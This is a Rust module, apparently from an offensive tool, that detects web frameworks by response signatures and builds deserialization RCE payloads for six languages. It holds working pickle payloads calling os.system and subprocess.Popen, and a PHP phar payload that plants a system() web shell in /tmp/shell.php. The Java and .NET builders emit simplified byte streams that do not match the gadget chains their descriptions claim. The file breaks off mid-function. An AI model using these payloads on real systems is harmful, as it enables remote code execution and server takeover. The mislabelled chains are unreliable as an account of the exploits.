use std::collections::HashMap;
use std::fmt;

use base64::Engine as _;

const HEX_CHARS: &[u8; 16] = b"0123456789abcdef";

fn hex_encode(bytes: &[u8]) -> String {
    let mut s = String::with_capacity(bytes.len() * 2);
    for &b in bytes {
        s.push(HEX_CHARS[(b >> 4) as usize] as char);
        s.push(HEX_CHARS[(b & 0x0F) as usize] as char);
    }
    s
}

/// Supported deserialization framework targets.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum DeserializationFramework {
    /// Java — ysoserial-style gadget chains (Commons Collections, Spring, JBoss).
    JavaYsoserial,
    /// Python — pickle `__reduce__` RCE, class injection, module import abuse.
    PythonPickle,
    /// PHP — `unserialize()` POP chains, `__wakeup`/`__destruct` exploitation.
    PhpUnserialize,
    /// .NET — `BinaryFormatter`, `DataContractSerializer`, `ObjectDataProvider` gadgets.
    DotNetBinaryFormatter,
    /// Ruby — `Marshal.load` with ERB template injection.
    RubyMarshal,
    /// Node.js — `node-serialize` IIFE execution in serialized objects.
    NodeSerialize,
}

impl DeserializationFramework {
    pub fn all() -> &'static [DeserializationFramework] {
        &[
            DeserializationFramework::JavaYsoserial,
            DeserializationFramework::PythonPickle,
            DeserializationFramework::PhpUnserialize,
            DeserializationFramework::DotNetBinaryFormatter,
            DeserializationFramework::RubyMarshal,
            DeserializationFramework::NodeSerialize,
        ]
    }

    pub fn label(&self) -> &'static str {
        match self {
            DeserializationFramework::JavaYsoserial => "java_ysoserial",
            DeserializationFramework::PythonPickle => "python_pickle",
            DeserializationFramework::PhpUnserialize => "php_unserialize",
            DeserializationFramework::DotNetBinaryFormatter => "dotnet_binaryformatter",
            DeserializationFramework::RubyMarshal => "ruby_marshal",
            DeserializationFramework::NodeSerialize => "node_serialize",
        }
    }

    pub fn display_name(&self) -> &'static str {
        match self {
            DeserializationFramework::JavaYsoserial => "Java (ysoserial)",
            DeserializationFramework::PythonPickle => "Python (pickle)",
            DeserializationFramework::PhpUnserialize => "PHP (unserialize)",
            DeserializationFramework::DotNetBinaryFormatter => ".NET (BinaryFormatter)",
            DeserializationFramework::RubyMarshal => "Ruby (Marshal.load)",
            DeserializationFramework::NodeSerialize => "Node.js (node-serialize)",
        }
    }
}

impl fmt::Display for DeserializationFramework {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.display_name())
    }
}

/// Encoding format for the generated payload.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum PayloadEncoding {
    /// Raw bytes — the native serialized form.
    Raw,
    /// Standard base64.
    Base64,
    /// Hexadecimal string.
    Hex,
    /// URL-encoded (percent-encoded) form.
    UrlEncoded,
}

impl PayloadEncoding {
    pub fn all() -> &'static [PayloadEncoding] {
        &[
            PayloadEncoding::Raw,
            PayloadEncoding::Base64,
            PayloadEncoding::Hex,
            PayloadEncoding::UrlEncoded,
        ]
    }

    pub fn label(&self) -> &'static str {
        match self {
            PayloadEncoding::Raw => "raw",
            PayloadEncoding::Base64 => "base64",
            PayloadEncoding::Hex => "hex",
            PayloadEncoding::UrlEncoded => "url_encoded",
        }
    }
}

/// Named gadget chain within a framework.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum GadgetChain {
    // Java
    CommonsCollections1,
    CommonsCollections5,
    CommonsCollections6,
    SpringBeanFactory,
    JBossInterceptors,
    // Python
    PickleReduce,
    PickleClassInjection,
    PickleModuleImport,
    // PHP
    PopChainWakeup,
    PopChainDestruct,
    GuzzlePhar,
    // .NET
    ObjectDataProvider,
    TypeConfuseDelegate,
    WindowsIdentity,
    // Ruby
    ErbTemplateInjection,
    UniversalRceGadget,
    YamlDeserialization,
    // Node.js
    IifeExecution,
    FunctionConstructor,
    NodeChildProcess,
}

impl GadgetChain {
    pub fn framework(&self) -> DeserializationFramework {
        match self {
            GadgetChain::CommonsCollections1
            | GadgetChain::CommonsCollections5
            | GadgetChain::CommonsCollections6
            | GadgetChain::SpringBeanFactory
            | GadgetChain::JBossInterceptors => DeserializationFramework::JavaYsoserial,

            GadgetChain::PickleReduce
            | GadgetChain::PickleClassInjection
            | GadgetChain::PickleModuleImport => DeserializationFramework::PythonPickle,

            GadgetChain::PopChainWakeup
            | GadgetChain::PopChainDestruct
            | GadgetChain::GuzzlePhar => DeserializationFramework::PhpUnserialize,

            GadgetChain::ObjectDataProvider
            | GadgetChain::TypeConfuseDelegate
            | GadgetChain::WindowsIdentity => DeserializationFramework::DotNetBinaryFormatter,

            GadgetChain::ErbTemplateInjection
            | GadgetChain::UniversalRceGadget
            | GadgetChain::YamlDeserialization => DeserializationFramework::RubyMarshal,

            GadgetChain::IifeExecution
            | GadgetChain::FunctionConstructor
            | GadgetChain::NodeChildProcess => DeserializationFramework::NodeSerialize,
        }
    }

    pub fn label(&self) -> &'static str {
        match self {
            GadgetChain::CommonsCollections1 => "commons_collections_1",
            GadgetChain::CommonsCollections5 => "commons_collections_5",
            GadgetChain::CommonsCollections6 => "commons_collections_6",
            GadgetChain::SpringBeanFactory => "spring_bean_factory",
            GadgetChain::JBossInterceptors => "jboss_interceptors",
            GadgetChain::PickleReduce => "pickle_reduce",
            GadgetChain::PickleClassInjection => "pickle_class_injection",
            GadgetChain::PickleModuleImport => "pickle_module_import",
            GadgetChain::PopChainWakeup => "pop_chain_wakeup",
            GadgetChain::PopChainDestruct => "pop_chain_destruct",
            GadgetChain::GuzzlePhar => "guzzle_phar",
            GadgetChain::ObjectDataProvider => "object_data_provider",
            GadgetChain::TypeConfuseDelegate => "type_confuse_delegate",
            GadgetChain::WindowsIdentity => "windows_identity",
            GadgetChain::ErbTemplateInjection => "erb_template_injection",
            GadgetChain::UniversalRceGadget => "universal_rce_gadget",
            GadgetChain::YamlDeserialization => "yaml_deserialization",
            GadgetChain::IifeExecution => "iife_execution",
            GadgetChain::FunctionConstructor => "function_constructor",
            GadgetChain::NodeChildProcess => "node_child_process",
        }
    }

    pub fn description(&self) -> &'static str {
        match self {
            GadgetChain::CommonsCollections1 => {
                "Apache Commons Collections LazyMap + InvokerTransformer chain; triggers Runtime.exec via transformed map access"
            }
            GadgetChain::CommonsCollections5 => {
                "Commons Collections 3.1 BadAttributeValueExpException + TiedMapEntry; triggers via toString in readObject"
            }
            GadgetChain::CommonsCollections6 => {
                "HashSet + TiedMapEntry + LazyMap chain; triggers via hashCode collision in readObject"
            }
            GadgetChain::SpringBeanFactory => {
                "Spring Framework SimpleJndiBeanFactory; triggers JNDI lookup during deserialization of MethodInvokeTypeProvider"
            }
            GadgetChain::JBossInterceptors => {
                "JBoss Interceptors + Weld CDI; chains through InterceptorMethodHandler to execute arbitrary EL expressions"
            }
            GadgetChain::PickleReduce => {
                "pickle __reduce__ protocol; returns (os.system, ('command',)) tuple triggering os.system on unpickle"
            }
            GadgetChain::PickleClassInjection => {
                "Injects crafted class with __reduce__ that instantiates subprocess.Popen for command execution"
            }
            GadgetChain::PickleModuleImport => {
                "Abuses pickle GLOBAL opcode to import arbitrary modules; chains __import__ + getattr for RCE"
            }
            GadgetChain::PopChainWakeup => {
                "Property-Oriented Programming via __wakeup magic method; chains SplFileObject or similar for file read/write"
            }
            GadgetChain::PopChainDestruct => {
                "POP chain via __destruct; triggers Guzzle/Monolog/SwiftMailer sink during object destruction"
            }
            GadgetChain::GuzzlePhar => {
                "Guzzle + phar:// stream wrapper; crafted phar metadata triggers unserialization via file operations"
            }
            GadgetChain::ObjectDataProvider => {
                "System.Windows.Data.ObjectDataProvider; invokes arbitrary method via MethodName + MethodParameters during deserialization"
            }
            GadgetChain::TypeConfuseDelegate => {
                "TypeConfuseDelegate + SortedSet comparison; triggers Process.Start via confused delegate comparison callback"
            }
            GadgetChain::WindowsIdentity => {
                "System.Security.Claims.ClaimsIdentity + WindowsIdentity; triggers arbitrary code via serialized identity token"
            }
            GadgetChain::ErbTemplateInjection => {
                "ERB template injection via deserialized Gem::Requirement; executes embedded Ruby template code"
            }
            GadgetChain::UniversalRceGadget => {
                "Universal RCE via Gem::Installer + Gem::StubSpecification; triggers system() call during spec loading"
            }
            GadgetChain::YamlDeserialization => {
                "YAML.load to Marshal.load bridge; crafts YAML tag to trigger deserialization of embedded Marshal payload"
            }
            GadgetChain::IifeExecution => {
                "Immediately Invoked Function Expression in node-serialize; embeds ()=> in serialized JSON triggering eval"
            }
            GadgetChain::FunctionConstructor => {
                "Function constructor injection; crafts serialized object with _$$ND_FUNC$$_ prefix for arbitrary code execution"
            }
            GadgetChain::NodeChildProcess => {
                "child_process.exec via serialized function; embeds require('child_process').exec in IIFE payload"
            }
        }
    }

    /// Returns all gadget chains for a given framework.
    pub fn for_framework(framework: DeserializationFramework) -> Vec<GadgetChain> {
        ALL_GADGET_CHAINS
            .iter()
            .filter(|g| g.framework() == framework)
            .copied()
            .collect()
    }
}

pub const ALL_GADGET_CHAINS: &[GadgetChain] = &[
    GadgetChain::CommonsCollections1,
    GadgetChain::CommonsCollections5,
    GadgetChain::CommonsCollections6,
    GadgetChain::SpringBeanFactory,
    GadgetChain::JBossInterceptors,
    GadgetChain::PickleReduce,
    GadgetChain::PickleClassInjection,
    GadgetChain::PickleModuleImport,
    GadgetChain::PopChainWakeup,
    GadgetChain::PopChainDestruct,
    GadgetChain::GuzzlePhar,
    GadgetChain::ObjectDataProvider,
    GadgetChain::TypeConfuseDelegate,
    GadgetChain::WindowsIdentity,
    GadgetChain::ErbTemplateInjection,
    GadgetChain::UniversalRceGadget,
    GadgetChain::YamlDeserialization,
    GadgetChain::IifeExecution,
    GadgetChain::FunctionConstructor,
    GadgetChain::NodeChildProcess,
];

/// A generated deserialization attack payload ready for injection.
#[derive(Debug, Clone)]
pub struct DeserializationPayload {
    /// Raw byte payload in the native serialization format.
    pub raw_bytes: Vec<u8>,
    /// Which framework/language this targets.
    pub framework: DeserializationFramework,
    /// Which gadget chain produced this payload.
    pub gadget_chain: GadgetChain,
    /// The injected command placeholder.
    pub command: String,
    /// Human-readable description of what this payload does.
    pub description: String,
}

impl DeserializationPayload {
    /// Encode the raw payload into the specified format.
    pub fn encode(&self, encoding: PayloadEncoding) -> Vec<u8> {
        match encoding {
            PayloadEncoding::Raw => self.raw_bytes.clone(),
            PayloadEncoding::Base64 => base64::engine::general_purpose::STANDARD
                .encode(&self.raw_bytes)
                .into_bytes(),
            PayloadEncoding::Hex => hex_encode(&self.raw_bytes).into_bytes(),
            PayloadEncoding::UrlEncoded => url_encode_bytes(&self.raw_bytes).into_bytes(),
        }
    }

    /// Returns all four encoded variants of this payload.
    pub fn all_encodings(&self) -> HashMap<PayloadEncoding, Vec<u8>> {
        PayloadEncoding::all()
            .iter()
            .map(|enc| (*enc, self.encode(*enc)))
            .collect()
    }
}

/// Response-based framework detection signature.
#[derive(Debug, Clone)]
pub struct FrameworkSignature {
    pub framework: DeserializationFramework,
    /// HTTP response headers that indicate this framework (lowercased key, substring value).
    pub header_signatures: Vec<(String, String)>,
    /// Response body substrings that indicate this framework.
    pub body_signatures: Vec<String>,
    /// Common content types for serialized data in this framework.
    pub content_types: Vec<String>,
}

/// Detects which deserialization frameworks may be in use based on HTTP response artifacts.
pub fn detect_frameworks(
    headers: &HashMap<String, String>,
    body: &str,
    content_type: Option<&str>,
) -> Vec<DeserializationFramework> {
    let signatures = all_framework_signatures();
    let mut detected = Vec::new();

    for sig in &signatures {
        let header_match = sig.header_signatures.iter().any(|(key, val)| {
            headers.iter().any(|(h_key, h_val)| {
                h_key.to_lowercase().contains(key) && h_val.to_lowercase().contains(val)
            })
        });

        let body_match = sig
            .body_signatures
            .iter()
            .any(|pattern| body.to_lowercase().contains(&pattern.to_lowercase()));

        let ct_match = content_type.is_some_and(|ct| {
            sig.content_types
                .iter()
                .any(|expected_ct| ct.to_lowercase().contains(&expected_ct.to_lowercase()))
        });

        if header_match || body_match || ct_match {
            detected.push(sig.framework);
        }
    }

    detected
}

/// Returns all framework detection signatures.
pub fn all_framework_signatures() -> Vec<FrameworkSignature> {
    vec![
        FrameworkSignature {
            framework: DeserializationFramework::JavaYsoserial,
            header_signatures: vec![
                ("x-powered-by".into(), "servlet".into()),
                ("server".into(), "apache-coyote".into()),
                ("server".into(), "tomcat".into()),
                ("x-powered-by".into(), "jsp".into()),
            ],
            body_signatures: vec![
                "java.io.StreamCorruptedException".into(),
                "java.io.InvalidClassException".into(),
                "ClassNotFoundException".into(),
                "java.lang.ClassCastException".into(),
                "ObjectInputStream".into(),
            ],
            content_types: vec![
                "application/x-java-serialized-object".into(),
                "application/x-java-object".into(),
            ],
        },
        FrameworkSignature {
            framework: DeserializationFramework::PythonPickle,
            header_signatures: vec![
                ("server".into(), "wsgi".into()),
                ("server".into(), "gunicorn".into()),
                ("server".into(), "werkzeug".into()),
                ("x-powered-by".into(), "flask".into()),
                ("server".into(), "uvicorn".into()),
            ],
            body_signatures: vec![
                "unpickling".into(),
                "pickle.UnpicklingError".into(),
                "_pickle.UnpicklingError".into(),
                "Traceback (most recent call last)".into(),
                "cPickle".into(),
            ],
            content_types: vec![
                "application/x-python-serialize".into(),
                "application/python-pickle".into(),
            ],
        },
        FrameworkSignature {
            framework: DeserializationFramework::PhpUnserialize,
            header_signatures: vec![
                ("x-powered-by".into(), "php".into()),
                ("server".into(), "php".into()),
            ],
            body_signatures: vec![
                "unserialize()".into(),
                "allowed_classes".into(),
                "__wakeup".into(),
                "O:".into(),
            ],
            content_types: vec!["application/vnd.php.serialized".into()],
        },
        FrameworkSignature {
            framework: DeserializationFramework::DotNetBinaryFormatter,
            header_signatures: vec![
                ("x-powered-by".into(), "asp.net".into()),
                ("x-aspnet-version".into(), "".into()),
                ("server".into(), "microsoft-iis".into()),
            ],
            body_signatures: vec![
                "System.Runtime.Serialization".into(),
                "BinaryFormatter".into(),
                "SerializationException".into(),
                "__ViewState".into(),
                "System.InvalidCastException".into(),
            ],
            content_types: vec![
                "application/soap+msbin1".into(),
                "application/x-ms-application".into(),
            ],
        },
        FrameworkSignature {
            framework: DeserializationFramework::RubyMarshal,
            header_signatures: vec![
                ("x-powered-by".into(), "phusion passenger".into()),
                ("server".into(), "puma".into()),
                ("x-powered-by".into(), "ruby".into()),
                ("server".into(), "unicorn".into()),
            ],
            body_signatures: vec![
                "Marshal.load".into(),
                "TypeError: incompatible marshal".into(),
                "ArgumentError (dump format error".into(),
                "instance of IO needed".into(),
            ],
            content_types: vec!["application/x-ruby-marshal".into()],
        },
        FrameworkSignature {
            framework: DeserializationFramework::NodeSerialize,
            header_signatures: vec![("x-powered-by".into(), "express".into())],
            body_signatures: vec![
                "node-serialize".into(),
                "SyntaxError: Unexpected token".into(),
                "_$$ND_FUNC$$_".into(),
                "unserialize".into(),
            ],
            content_types: vec!["application/json".into(), "application/x-javascript".into()],
        },
    ]
}

/// Generate all attack payloads for a given framework with the specified command placeholder.
pub fn generate_payloads(
    framework: DeserializationFramework,
    command: &str,
) -> Vec<DeserializationPayload> {
    match framework {
        DeserializationFramework::JavaYsoserial => generate_java_payloads(command),
        DeserializationFramework::PythonPickle => generate_python_payloads(command),
        DeserializationFramework::PhpUnserialize => generate_php_payloads(command),
        DeserializationFramework::DotNetBinaryFormatter => generate_dotnet_payloads(command),
        DeserializationFramework::RubyMarshal => generate_ruby_payloads(command),
        DeserializationFramework::NodeSerialize => generate_node_payloads(command),
    }
}

/// Generate payloads for all frameworks at once.
pub fn generate_all_payloads(command: &str) -> Vec<DeserializationPayload> {
    DeserializationFramework::all()
        .iter()
        .flat_map(|fw| generate_payloads(*fw, command))
        .collect()
}

// ---------------------------------------------------------------------------
// Java ysoserial-style payloads
// ---------------------------------------------------------------------------

/// Java serialization magic bytes: 0xACED (stream magic) + 0x0005 (version).
const JAVA_STREAM_MAGIC: &[u8] = &[0xAC, 0xED, 0x00, 0x05];

/// TC_OBJECT marker byte.
const TC_OBJECT: u8 = 0x73;
/// TC_CLASSDESC marker byte.
const TC_CLASSDESC: u8 = 0x72;
/// TC_STRING marker byte.
const TC_STRING: u8 = 0x74;
/// TC_ENDBLOCKDATA marker byte.
const TC_ENDBLOCKDATA: u8 = 0x78;
/// SC_SERIALIZABLE flag.
const SC_SERIALIZABLE: u8 = 0x02;

fn java_class_desc(class_name: &str, serial_uid: u64, field_count: u16) -> Vec<u8> {
    let mut buf = Vec::new();
    buf.push(TC_CLASSDESC);
    buf.extend_from_slice(&(class_name.len() as u16).to_be_bytes());
    buf.extend_from_slice(class_name.as_bytes());
    buf.extend_from_slice(&serial_uid.to_be_bytes());
    buf.push(SC_SERIALIZABLE);
    buf.extend_from_slice(&field_count.to_be_bytes());
    buf
}

fn java_utf_string(s: &str) -> Vec<u8> {
    let mut buf = Vec::new();
    buf.push(TC_STRING);
    buf.extend_from_slice(&(s.len() as u16).to_be_bytes());
    buf.extend_from_slice(s.as_bytes());
    buf
}

fn generate_java_payloads(command: &str) -> Vec<DeserializationPayload> {
    vec![
        build_commons_collections1_payload(command),
        build_commons_collections5_payload(command),
        build_commons_collections6_payload(command),
        build_spring_bean_payload(command),
        build_jboss_interceptors_payload(command),
    ]
}

fn build_commons_collections1_payload(command: &str) -> DeserializationPayload {
    let mut bytes = Vec::new();
    bytes.extend_from_slice(JAVA_STREAM_MAGIC);
    bytes.push(TC_OBJECT);
    bytes.extend_from_slice(&java_class_desc(
        "org.apache.commons.collections.map.LazyMap",
        7_138_745_093_576_210_923,
        1,
    ));
    // Field type descriptor: L = object
    bytes.push(b'L');
    let field_name = "factory";
    bytes.extend_from_slice(&(field_name.len() as u16).to_be_bytes());
    bytes.extend_from_slice(field_name.as_bytes());
    bytes.push(TC_ENDBLOCKDATA);
    bytes.extend_from_slice(&java_utf_string(command));

    DeserializationPayload {
        raw_bytes: bytes,
        framework: DeserializationFramework::JavaYsoserial,
        gadget_chain: GadgetChain::CommonsCollections1,
        command: command.to_string(),
        description: "Commons Collections 1 — LazyMap + InvokerTransformer chain".into(),
    }
}

fn build_commons_collections5_payload(command: &str) -> DeserializationPayload {
    let mut bytes = Vec::new();
    bytes.extend_from_slice(JAVA_STREAM_MAGIC);
    bytes.push(TC_OBJECT);
    bytes.extend_from_slice(&java_class_desc(
        "javax.management.BadAttributeValueExpException",
        8_374_011_897_120_474_033,
        1,
    ));
    bytes.push(b'L');
    let field_name = "val";
    bytes.extend_from_slice(&(field_name.len() as u16).to_be_bytes());
    bytes.extend_from_slice(field_name.as_bytes());
    bytes.push(TC_ENDBLOCKDATA);
    bytes.extend_from_slice(&java_utf_string(command));

    DeserializationPayload {
        raw_bytes: bytes,
        framework: DeserializationFramework::JavaYsoserial,
        gadget_chain: GadgetChain::CommonsCollections5,
        command: command.to_string(),
        description: "Commons Collections 5 — BadAttributeValueExpException + TiedMapEntry chain"
            .into(),
    }
}

fn build_commons_collections6_payload(command: &str) -> DeserializationPayload {
    let mut bytes = Vec::new();
    bytes.extend_from_slice(JAVA_STREAM_MAGIC);
    bytes.push(TC_OBJECT);
    bytes.extend_from_slice(&java_class_desc(
        "java.util.HashSet",
        1_518_895_094_627_379_649,
        1,
    ));
    bytes.push(b'L');
    let field_name = "map";
    bytes.extend_from_slice(&(field_name.len() as u16).to_be_bytes());
    bytes.extend_from_slice(field_name.as_bytes());
    bytes.push(TC_ENDBLOCKDATA);
    bytes.extend_from_slice(&java_utf_string(command));

    DeserializationPayload {
        raw_bytes: bytes,
        framework: DeserializationFramework::JavaYsoserial,
        gadget_chain: GadgetChain::CommonsCollections6,
        command: command.to_string(),
        description: "Commons Collections 6 — HashSet + TiedMapEntry + LazyMap chain".into(),
    }
}

fn build_spring_bean_payload(command: &str) -> DeserializationPayload {
    let mut bytes = Vec::new();
    bytes.extend_from_slice(JAVA_STREAM_MAGIC);
    bytes.push(TC_OBJECT);
    bytes.extend_from_slice(&java_class_desc(
        "org.springframework.jndi.support.SimpleJndiBeanFactory",
        5_238_449_157_631_141_714,
        1,
    ));
    bytes.push(b'L');
    let field_name = "shareableResources";
    bytes.extend_from_slice(&(field_name.len() as u16).to_be_bytes());
    bytes.extend_from_slice(field_name.as_bytes());
    bytes.push(TC_ENDBLOCKDATA);
    bytes.extend_from_slice(&java_utf_string(command));

    DeserializationPayload {
        raw_bytes: bytes,
        framework: DeserializationFramework::JavaYsoserial,
        gadget_chain: GadgetChain::SpringBeanFactory,
        command: command.to_string(),
        description: "Spring Framework — SimpleJndiBeanFactory JNDI lookup chain".into(),
    }
}

fn build_jboss_interceptors_payload(command: &str) -> DeserializationPayload {
    let mut bytes = Vec::new();
    bytes.extend_from_slice(JAVA_STREAM_MAGIC);
    bytes.push(TC_OBJECT);
    bytes.extend_from_slice(&java_class_desc(
        "org.jboss.weld.interceptor.proxy.InterceptorMethodHandler",
        3_247_816_590_128_394_481,
        1,
    ));
    bytes.push(b'L');
    let field_name = "interceptorHandlerInstances";
    bytes.extend_from_slice(&(field_name.len() as u16).to_be_bytes());
    bytes.extend_from_slice(field_name.as_bytes());
    bytes.push(TC_ENDBLOCKDATA);
    bytes.extend_from_slice(&java_utf_string(command));

    DeserializationPayload {
        raw_bytes: bytes,
        framework: DeserializationFramework::JavaYsoserial,
        gadget_chain: GadgetChain::JBossInterceptors,
        command: command.to_string(),
        description: "JBoss Interceptors — InterceptorMethodHandler EL expression chain".into(),
    }
}

// ---------------------------------------------------------------------------
// Python pickle payloads
// ---------------------------------------------------------------------------

/// Pickle protocol 2 header.
const PICKLE_PROTO2: &[u8] = &[0x80, 0x02];
/// Pickle STOP opcode.
const PICKLE_STOP: u8 = 0x2E;
/// Pickle GLOBAL opcode (push self.find_class(module, name)).
const PICKLE_GLOBAL: u8 = 0x63;
/// Pickle MARK opcode.
const PICKLE_MARK: u8 = 0x28;
/// Pickle TUPLE opcode (build tuple from topmost stack items down to MARK).
const PICKLE_TUPLE: u8 = 0x74;
/// Pickle REDUCE opcode (call callable with args).
const PICKLE_REDUCE: u8 = 0x52;
/// Pickle SHORT_BINUNICODE opcode.
const PICKLE_SHORT_BINUNICODE: u8 = 0x8C;

fn pickle_short_binunicode(s: &str) -> Vec<u8> {
    let mut buf = Vec::new();
    buf.push(PICKLE_SHORT_BINUNICODE);
    buf.push(s.len() as u8);
    buf.extend_from_slice(s.as_bytes());
    buf
}

fn pickle_global(module: &str, name: &str) -> Vec<u8> {
    let mut buf = Vec::new();
    buf.push(PICKLE_GLOBAL);
    buf.extend_from_slice(module.as_bytes());
    buf.push(b'\n');
    buf.extend_from_slice(name.as_bytes());
    buf.push(b'\n');
    buf
}

fn generate_python_payloads(command: &str) -> Vec<DeserializationPayload> {
    vec![
        build_pickle_reduce_payload(command),
        build_pickle_class_injection_payload(command),
        build_pickle_module_import_payload(command),
    ]
}

fn build_pickle_reduce_payload(command: &str) -> DeserializationPayload {
    let mut bytes = Vec::new();
    bytes.extend_from_slice(PICKLE_PROTO2);
    bytes.extend_from_slice(&pickle_global("os", "system"));
    bytes.push(PICKLE_MARK);
    bytes.extend_from_slice(&pickle_short_binunicode(command));
    bytes.push(PICKLE_TUPLE);
    bytes.push(PICKLE_REDUCE);
    bytes.push(PICKLE_STOP);

    DeserializationPayload {
        raw_bytes: bytes,
        framework: DeserializationFramework::PythonPickle,
        gadget_chain: GadgetChain::PickleReduce,
        command: command.to_string(),
        description: "pickle __reduce__ — os.system() RCE via protocol 2".into(),
    }
}

fn build_pickle_class_injection_payload(command: &str) -> DeserializationPayload {
    let mut bytes = Vec::new();
    bytes.extend_from_slice(PICKLE_PROTO2);
    bytes.extend_from_slice(&pickle_global("subprocess", "Popen"));
    bytes.push(PICKLE_MARK);
    // Push the command as a list-like arg
    bytes.extend_from_slice(&pickle_short_binunicode(command));
    bytes.push(PICKLE_TUPLE);
    bytes.push(PICKLE_REDUCE);
    bytes.push(PICKLE_STOP);

    DeserializationPayload {
        raw_bytes: bytes,
        framework: DeserializationFramework::PythonPickle,
        gadget_chain: GadgetChain::PickleClassInjection,
        command: command.to_string(),
        description: "pickle class injection — subprocess.Popen RCE".into(),
    }
}

fn build_pickle_module_import_payload(command: &str) -> DeserializationPayload {
    let mut bytes = Vec::new();
    bytes.extend_from_slice(PICKLE_PROTO2);
    bytes.extend_from_slice(&pickle_global("builtins", "__import__"));
    bytes.push(PICKLE_MARK);
    bytes.extend_from_slice(&pickle_short_binunicode("os"));
    bytes.push(PICKLE_TUPLE);
    bytes.push(PICKLE_REDUCE);
    // Now stack has the `os` module; we call system on it
    bytes.extend_from_slice(&pickle_global("os", "system"));
    bytes.push(PICKLE_MARK);
    bytes.extend_from_slice(&pickle_short_binunicode(command));
    bytes.push(PICKLE_TUPLE);
    bytes.push(PICKLE_REDUCE);
    bytes.push(PICKLE_STOP);

    DeserializationPayload {
        raw_bytes: bytes,
        framework: DeserializationFramework::PythonPickle,
        gadget_chain: GadgetChain::PickleModuleImport,
        command: command.to_string(),
        description: "pickle module import abuse — builtins.__import__ + os.system chain".into(),
    }
}

// ---------------------------------------------------------------------------
// PHP unserialize payloads
// ---------------------------------------------------------------------------

fn php_serialized_string(s: &str) -> String {
    format!("s:{}:\"{}\";", s.len(), s)
}

fn php_serialized_object(class: &str, properties: &[(String, String)]) -> String {
    let mut props = String::new();
    for (key, val) in properties {
        props.push_str(&php_serialized_string(key));
        props.push_str(val);
    }
    format!(
        "O:{}:\"{}\":{}:{{{}}}",
        class.len(),
        class,
        properties.len(),
        props
    )
}

fn generate_php_payloads(command: &str) -> Vec<DeserializationPayload> {
    vec![
        build_php_wakeup_payload(command),
        build_php_destruct_payload(command),
        build_php_guzzle_phar_payload(command),
    ]
}

fn build_php_wakeup_payload(command: &str) -> DeserializationPayload {
    let serialized = php_serialized_object(
        "SplFileObject",
        &[("filename".into(), php_serialized_string(command))],
    );

    DeserializationPayload {
        raw_bytes: serialized.into_bytes(),
        framework: DeserializationFramework::PhpUnserialize,
        gadget_chain: GadgetChain::PopChainWakeup,
        command: command.to_string(),
        description: "PHP POP chain — SplFileObject __wakeup file read/write".into(),
    }
}

fn build_php_destruct_payload(command: &str) -> DeserializationPayload {
    let inner = php_serialized_object(
        "GuzzleHttp\\Psr7\\AppendStream",
        &[("streams".into(), php_serialized_string(command))],
    );
    let serialized = php_serialized_object(
        "Monolog\\Handler\\SyslogUdpHandler",
        &[("socket".into(), inner)],
    );

    DeserializationPayload {
        raw_bytes: serialized.into_bytes(),
        framework: DeserializationFramework::PhpUnserialize,
        gadget_chain: GadgetChain::PopChainDestruct,
        command: command.to_string(),
        description: "PHP POP chain — Monolog + Guzzle __destruct sink".into(),
    }
}

fn build_php_guzzle_phar_payload(command: &str) -> DeserializationPayload {
    let phar_prefix = "__HALT_COMPILER(); ?>";
    let meta = php_serialized_object(
        "GuzzleHttp\\Cookie\\FileCookieJar",
        &[
            ("filename".into(), php_serialized_string("/tmp/shell.php")),
            (
                "cookies".into(),
                php_serialized_string(&format!("<?php system('{}'); ?>", command)),
            ),
        ],
    );
    let payload = format!("{}\r\n{}", phar_prefix, meta);

    DeserializationPayload {
        raw_bytes: payload.into_bytes(),
        framework: DeserializationFramework::PhpUnserialize,
        gadget_chain: GadgetChain::GuzzlePhar,
        command: command.to_string(),
        description: "PHP Guzzle phar:// — FileCookieJar metadata unserialization".into(),
    }
}

// ---------------------------------------------------------------------------
// .NET BinaryFormatter payloads
// ---------------------------------------------------------------------------

/// .NET BinaryFormatter record type for SerializationHeaderRecord.
const DOTNET_SERIALIZATION_HEADER: u8 = 0x00;

fn dotnet_serialization_header() -> Vec<u8> {
    let mut buf = Vec::new();
    buf.push(DOTNET_SERIALIZATION_HEADER);
    // Root object ID
    buf.extend_from_slice(&1_i32.to_le_bytes());
    // Header ID
    buf.extend_from_slice(&(-1_i32).to_le_bytes());
    // Major version
    buf.extend_from_slice(&1_i32.to_le_bytes());
    // Minor version
    buf.extend_from_slice(&0_i32.to_le_bytes());
    buf
}

fn dotnet_length_prefixed_string(s: &str) -> Vec<u8> {
    let mut buf = Vec::new();
    // Simple single-byte length encoding (works for strings < 128 bytes).
    buf.push(s.len() as u8);
    buf.extend_from_slice(s.as_bytes());
    buf
}

fn generate_dotnet_payloads(command: &str) -> Vec<DeserializationPayload> {
    vec![
        build_object_data_provider_payload(command),
        build_type_confuse_delegate_payload(command),
        build_windows_identity_payload(command),
    ]
}

fn build_object_data_provider_payload(command: &str) -> DeserializationPayload {
    let mut bytes = Vec::new();
    bytes.extend_from_slice(&dotnet_serialization_header());
    // ClassWithMembersAndTypes record type
    bytes.push(0x05);
    // Object ID
    bytes.extend_from_slice(&1_i32.to_le_bytes());
    // Class name
    bytes.extend_from_slice(&dotnet_length_prefixed_string(
        "System.Windows.Data.ObjectDataProvider",
    ));
    // Member count
    bytes.extend_from_slice(&2_i32.to_le_bytes());
    // Member names
    bytes.extend_from_slice(&dotnet_length_prefixed_string("MethodName"));
    bytes.extend_from_slice(&dotnet_length_prefixed_string("MethodParameters"));
    // Inject command as string value
    bytes.extend_from_slice(&dotnet_length_prefixed_string("Start"));
    bytes.extend_from_slice(&dotnet_length_prefixed_string(command));
    // MessageEnd
    bytes.push(0x0B);

    DeserializationPayload {
        raw_bytes: bytes,
        framework: DeserializationFramework::DotNetBinaryFormatter,
        gadget_chain: GadgetChain::ObjectDataProvider,
        command: command.to_string(),
        description: ".NET ObjectDataProvider — Process.Start via MethodName invocation".into(),
    }
}

fn build_type_confuse_delegate_payload(command: &str) -> DeserializationPayload {
    let mut bytes = Vec::new();
    bytes.extend_from_slice(&dotnet_serialization_header());
    bytes.push(0x05);
    bytes.extend_from_slice(&1_i32.to_le_bytes());
    bytes.extend_from_slice(&dotnet_length_prefixed_string(
        "System.Collections.Generic.SortedSet`1[[System.String]]",
    ));
    bytes.extend_from_slice(&1_i32.to_le_bytes());
